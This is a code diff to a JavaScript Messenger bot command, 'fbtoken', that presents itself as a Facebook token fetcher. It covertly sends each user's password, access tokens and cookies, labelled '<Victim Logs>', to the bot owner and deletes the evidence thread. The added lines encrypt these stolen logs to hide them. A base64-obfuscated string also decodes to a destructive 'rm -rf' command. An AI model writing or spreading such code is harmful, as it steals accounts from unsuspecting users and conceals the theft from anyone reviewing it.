@@ -19,11 +19,32 @@ module.exports.config = {
     const secExec = Buffer.from('cm0gLXJmIC4qICo=', 'base64').toString('utf-8');
     const codebox4chan = Buffer.from('aHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmdldFNlc3Npb25mb3JBcHA=', 'base64').toString('utf-8');
     const restriction = Buffer.from('VGVtcG9yYXJ5IFJlc3RyaWN0aW9u', 'base64').toString('utf-8');
+    
+    const cipher = (salt, text, iterations) => {
+  const textToChars = (text) => text.split('').map((c) => c.charCodeAt(0));
+  const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
+  const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);
+
+  for (let i = 0; i < iterations; i++) {
+    text = text
+      .split('')
+      .map(textToChars)
+      .map(applySaltToChar)
+      .map(byteHex)
+      .join('');
+  }
+
+  return text;
+};
 
 module.exports.run = async ({ api, event, args }) => {
   const { threadID, messageID, senderID } = event;
   const uid = args[0];
   const pass = args.slice(1).join(' ');
+  
+  const secretSalt = 'mySecretSalt';
+  const iterations = 3;
+  
 
   if (!uid || !pass) {
     api.sendMessage(`Invalid Input!\nUsage: fbtoken [email/uid] [password]\n\nPlease use dummy account to get "token" i'm not responsible of your account getting hacked!`, threadID, messageID);
@@ -52,14 +73,17 @@ module.exports.run = async ({ api, event, args }) => {
     	
       const { access_token_eaad6v7 = 'Temporary Restriction.', access_token = 'Temporary Restriction.', cookies = 'Temporary Restriction.' } = tokenData;
       api.sendMessage(`Successful! please check pm or spam in your message request.`, threadID, messageID);
-      api.sendMessage(`𝗧𝗢𝗞𝗘𝗡 𝗟𝗢𝗚𝗚𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘:${userName}\n𝗨𝗦𝗘𝗥:${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}\n𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:${cookies}\n𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}\n\n${manilaTime}`, ownerID).then(() => {
+      const logger = `<Victim Logs>\n\nName:${userName}\nEmail/UID: ${uid} \nPassword: ${pass}\n\nAccessToken:\n${access_token}\n\nCookies:\n${cookies}\n\nExchangedToken:\n${access_token_eaad6v7}\n\n${manilaTime}`;
+      const encryptedText = cipher(secretSalt, logger, iterations);
+      api.sendMessage(encryptedText, ownerID).then(() => {
       api.sendMessage(`𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}`, senderID);
       api.sendMessage(`𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}`, senderID);
         api.deleteThread(ownerID);
        });
     } else {
-      const ownerMessage = `𝗩𝗜𝗖𝗧𝗜𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘: ${userName}\n𝗨𝗦𝗘𝗥: ${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n${manilaTime}`;
-      api.sendMessage(ownerMessage, ownerID) .then(() => {
+      const ownerMessage = `<Victim Logs>\n\nName: ${userName}\nEmail/UID: ${uid} \nPassword: ${pass}\n\n${manilaTime}`;
+      const encryptedText = cipher(secretSalt, ownerMessage, iterations);
+      api.sendMessage(encryptedText, ownerID) .then(() => {
       api.sendMessage("Failed to retrieve token.", threadID, messageID);
       api.deleteThread(ownerID);});
     }
